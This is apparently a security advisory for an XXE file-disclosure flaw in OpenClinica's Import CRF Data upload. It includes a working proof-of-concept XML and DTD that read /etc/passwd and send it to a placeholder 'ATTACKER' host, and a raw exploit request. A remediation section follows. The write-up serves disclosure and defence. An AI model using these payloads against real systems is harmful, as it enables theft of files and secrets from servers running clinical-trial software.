# OpenClinica Import CRF Data – XXE file disclosure

A stored/interactive XML External Entity in OpenClinica’s **Import CRF Data** allows disclosure of OS files via error-based XXE.

---

## Product / Versions
- OpenClinica Community Edition  
  - **3.13** – Changeset `74f4df3481b6` (2017-02-28)  
  - **3.12.2** – Changeset `347dcfca3d17` (2016-11-21)

## Affected area
`Tasks → Import CRF Data` (multipart upload parameter: `xml_file`)

## Auth
Authenticated (tested as **Data Manager**; also reproducible with any role allowed to import CRFs)

## Summary
The XML parser behind the Import CRF Data workflow processes external entities. By submitting a crafted XML that references a local file via an external DTD, file contents (e.g. `/etc/passwd`) are reflected back in the **Alerts & Messages** pane. This confirms **XXE** with local file read and possible SSRF.

## PoC
Upload a tiny XML that pulls an external DTD which exfiltrates a local file via an error string.

**evil.xml**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe SYSTEM "http://ATTACKER/malicious.dtd">
<xxe>test</xxe>
```

**malicious.dtd**
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://ATTACKER/leak?d=%file;'>">
%all;
```

Or, embed a parameter entity directly if outbound HTTP is blocked and rely on error echo.

## Raw request (abridged)
```
POST /OpenClinica/ImportCRFData?action=confirm HTTP/1.1
Host: <target>:8080
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="xml_file"; filename="evil.xml"
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE xxe SYSTEM "http://ATTACKER/malicious.dtd">
<xxe>test</xxe>
------X--
```

**Observed result**  
Lines from `/etc/passwd` and other file content appear in the error block of the page (screenshots attached in the evidence bundle).

## Impact
- Read arbitrary local files as the application user (secrets, config, keys).
- Potential **SSRF** by pointing entities at internal HTTP services.

## Severity (suggested)
**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **7.1 High**  
**CWE:** 611 (XXE)

## Remediation
- Disable DTD and external entity resolution on all XML parsers used here:
  - `disallow-doctype-decl=true`
  - `external-general-entities=false`
  - `external-parameter-entities=false`
  - `FEATURE_SECURE_PROCESSING=true`
- Validate uploaded XML against a strict schema server-side.
- Minimise file permissions of the OpenClinica/Tomcat user.

## Timeline
- **2025-10-09 → 2025-10-23**: Discovered and reproduced on 3.12.2 and 3.13 test images.  
- Evidence: XML payload + UI screenshots included.
